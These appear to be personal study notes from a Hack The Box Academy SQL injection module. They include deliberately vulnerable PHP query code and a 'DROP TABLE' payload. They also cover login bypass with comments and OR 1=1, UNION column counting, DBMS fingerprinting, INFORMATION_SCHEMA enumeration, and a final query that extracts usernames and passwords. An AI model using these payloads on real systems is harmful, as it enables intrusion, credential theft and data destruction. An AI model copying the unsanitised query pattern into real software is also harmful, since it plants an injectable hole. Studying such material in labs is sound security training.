# SQL-Injection
https://academy.hackthebox.com/module/33/section/193

- Connecting to database through php
```php
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = conn->query($query);

while($row = $result->fetch_assoc()) {
	echo $row["name"]."<br>";
}
```

- User input from page to query users
```php
$searchInput = $_POST['finduser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);

while($row = $result->fetch_assoc()) {
	echo $row["name"]."<br>";
}
```

It's very obvious this program has no input sanitization.
We are able to terminate `$searchInput` similar to XSS
and will be able to do whatever we want:

```sql
'%1'; DROP TABLE users;' --defacing the database

::executed as: select * from logins where username like '%1'; DROP TABLE users;'
```

# Subverting Query Logic

- Normal login data-query
```sql
SELECT * FROM logins WHERE username='admin' AND password='p@ssw0rd123!';
```

## SQLi "Bad Characters"

- Testing whether the form is vulnerable to SQLi, appending characters to a username
and checking for any errors or changes in page behavior.
```
Payload 	URL Encoded
-------		-----------
'			%27
"			%22
#			%23
;			%3B
)			%29
```

Testing with a single quote (') we can check for odd-numbered syntax errors.
In this case, we can either comment out the rest of the query or simply use 
an even number of quotes.

> OR based injection `' OR 1=1 --` commenting the end of line, in order to cancel
the rest of the logic.

## A more complex example

```sql
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='p@ssw0rd123!';
```

The login will fail because `admin's id` is 1 
and conditional statement says `id must be greater than 1`.

We can close the input and use comments 
in order to select only the first half of the login logic.

```sql
SELECT * FROM logins WHERE (username='admin'--' AND id > 1) AND password='p@ssw0rd123!'
[*]SYNTAX-ERROR!!

```

Trying with:

```sql
SELECT * FROM logins WHERE (username='admin')--' AND id > 1) AND password='p@ssw0rd123
[+]Login Successful.
```

## UNION Clause

The Union Clause is used to combine results from multiple SELECT statements.

```sql
SELECT * FROM ports;
SELECT * FROM ships;
SELECT * FROM ports UNION SELECT * FROM ships;

-- Note that data types of selected columns in all positions should match.
-- Also note that they must have the same number of columns.

-- Otherwise:
ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

## Even Columns

Once we have two queries that match columns and types, we can use the UNION operator
to extract data from other tables and databases.

```sql
SELECT * FROM products WHERE product_id = 'user_input';
SELECT * FROM products WHERE product_id = '1' UNION SELECT username, password FROM passwords--'
```

## Uneven Columns

We can use junk data.
The `products` table has three columns,

If we only wanted to return one column we have to:
```sql
SELECT * FROM products WHERE product_id = '1' UNION SELECT username,2,3 FROM passwords--'
```

# Union Injection

- Fuzz for bad characters (SQLi Enumeration)
- Detect number of columns:

	`' ORDER BY 5--`: If fails, it means we have 4 columns.
	`' UNION SELECT 1,2,3,4--` If success, it means we have 4 columns.

- Location of Injection
- Testing Parameters: `UNION SELECT 1,@@version,3,4--`: Success print for #2.
- Fingerprinting DBMS, confirming MySQL:

	`SELECT @@version` When full-query output. Works in: MSSQL
	`SELECT POW(1,1)` When only numeric output. Works in: MySQL
	`SELECT SLEEP(5)` When Blind, Only works on MySQL

## INFORMATION_SCHEMA Database

In order to pull data from tables using UNION SELECT we need to properly form
SELECT queries. We need the following information:

- List of databases
- List of tables within each database
- List of columns within each table

In the Union Injection Section, we implied that we have 4 columns to work with
and that column #2 will print out for us.

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA; --List all databases

-- Here, in practice with our theoretical database containing 3 columns:
UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- List all dbs
UNION SELECT 1,database(),2,3-- Which db does the running application use?

```
Once we know the db our application is using, we need to get a list of tables.

```sql
UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4 
FROM INFORMATION_SCHEMA.TABLES 
WHERE table_schema='our_desired_table'--
```

We now have to find the column names in the table.

```sql
UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA
FROM INFORMATION_SCHEMA.COLUMNS
WHERE table_name='credentials_table'--
```

Once we have the column names, it's a wrap ~

```sql
UNION SELECT 1, username, password, 4 FROM our_desired_table.credentials_table--

Print:
username	password
--------	--------
admin		o_shit...
```